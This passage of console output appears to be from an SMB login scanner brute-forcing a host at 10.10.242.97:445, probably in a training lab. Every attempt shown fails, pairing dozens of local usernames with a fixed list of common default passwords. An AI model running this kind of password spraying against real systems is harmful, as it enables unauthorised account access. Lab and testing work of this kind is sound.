[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmiebar:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jimmypor:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:dietpi',
